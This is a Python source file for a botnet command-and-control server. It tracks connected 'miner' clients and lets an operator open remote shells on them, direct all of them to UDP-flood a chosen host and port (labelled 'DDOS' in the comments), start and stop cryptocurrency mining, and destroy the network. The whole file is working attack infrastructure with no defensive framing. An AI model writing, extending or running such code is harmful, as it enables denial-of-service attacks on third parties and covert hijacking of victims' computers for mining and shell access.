from client import Client
import threading, time, socket

ADDR = ('127.0.0.1', 5002)
current_clients = []
address_book = []
manager = None
client_objects = []

def init_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(ADDR)
    print('\n[STARTING] Server initialzing...\n')
    main(server)



def handle_manager(conn, addr, server):
    #handle controller connection
    global address_book
    connected = True
    manager = conn
    print(f'[CONNECTION] Controller {addr[0]} connected')
    while connected:
                #command loop
                command = conn.recv(1024).decode('utf-8')
                
                #code for shell
                if command == 'startshell':
                    if len(client_objects) > 0:
                        clientobject = client_objects[int(conn.recv(1024).decode('utf-8')) - 1]
                        if clientobject.start_shell():
                            conn.send('connected'.encode('utf-8'))
                            while True:
                                comm = conn.recv(1024).decode('utf-8')
                                clientobject.send_shell_command(comm)
                                if comm != 'stop':
                                    response = clientobject.recieve_shell_response()
                                    conn.send(response.encode('utf-8'))
                                else:
                                    break
                                response = None
                        else:
                            conn.send('failed'.encode('utf-8'))
                        
                            
                    else:
                        continue
                        
                    
                #code for indexing miners
                elif command == 'cliget':
                    for client in address_book:
                        address = client[0] + ':' + str(client[1])
                        conn.send(address.encode('utf-8'))
                        time.sleep(0.5)
                    #conn.send(f'{len(address_book)} clients active'.encode('utf-8'))
                    print('clients reported')
                    time.sleep(2)
                    conn.send('done'.encode('utf-8'))

                #code for DDOS
                elif command =='ping':
                    hostname = conn.recv(1024).decode('utf-8')
                    time.sleep(0.5)
                    port = int(conn.recv(1024).decode('utf-8'))
                    print('Hostname and Port recieved')
                    print(f'[NOTICE] UDP flooding {hostname} on port {port}')
                    for i, client in enumerate(client_objects):
                        client.start_ping(hostname, port)
                        print(f'Client {i+1} started')
                    
                    conn.send(f'[NOTICE] UDP flooding {hostname} on port {port}'.encode('utf-8'))
                #stop ddos
                elif command == 'noping':
                    for i, client in enumerate(client_objects):
                        client.stop_ping()
                        print('[NOTICE] UDP Flood stopped...')
                #start mining   
                elif command =='startmine':
                    print('[NOTICE] Starting Miners')
                    for i, client in enumerate(client_objects):
                        client.start_mine()
                    print(f'[NOTICE] {len(client_objects)} miners started')
                    conn.send(f'{len(client_objects)} miners started'.encode('utf-8'))
                #stop mining 
                elif command =='stopmine':
                    print('[NOTICE] Stopping Miners')
                    for i, client in enumerate(client_objects):
                        client.stop_mine()
                    print(f'[NOTICE] {len(client_objects)} miners stopped')
                    conn.send(f'{len(client_objects)} miners stopped'.encode('utf-8'))
                #destroy network
                elif command =='selfdestruct':
                    print(f'[ALERT!!!] Destroying {len(client_objects)} Miners')
                    for i, client in enumerate(client_objects):
                        client.destroy()
                    print(f'[ALERT!!!] {len(client_objects)} Miners Destroyed')
                    conn.send('done.'.encode('utf-8'))
                    
                else:
                    conn.send('Invalid Command.'.encode('utf-8'))
                    time.sleep(0.5)
                    continue
            

def handle_client(conn, addr, server):
    #handle miner connection
    try:
        connected = True
        client = Client(conn, addr, server)
        current_clients.append(client)
        client_objects.append(client)
        index = len(current_clients) - 1
        while connected:
            #print(f'Client {index + 1}')
            #check if the client is still connected
            client.checkup()
            #change this value to change checkup frequency
            time.sleep(500)
    except:
            print(f'\n[NOTICE] Connection with {addr[0]} closed')
            current_clients.remove(client)
            client_objects.remove(client)
            
                   
    
            
            
    
def main(server):
    #handle all connections with the controller and clients
    global address_book
    server.listen()
    print(f'[INFO] Listening on {ADDR[0]}:{ADDR[1]}\n')
    print(f'[WAITING] Waiting for connections...\n')
    while True:
            conn, addr = server.accept()
            managecheck = conn.recv(1024)
            if managecheck.decode('utf-8') == 'manager':
                conn.send('verified'.encode('utf-8'))
                manager = conn
                t1 = threading.Thread(target=handle_manager, args=(conn, addr, server))
                t1.start()
                managecheck = None
            elif managecheck.decode('utf-8') == 'client':
                address_book.append(addr)
                t1 = threading.Thread(target=handle_client, args=(conn, addr, server))
                t1.start() 
                managecheck = None
        
            print(f'\n[ACTIVE] Miners: {len(client_objects)}\n')
        
init_server()

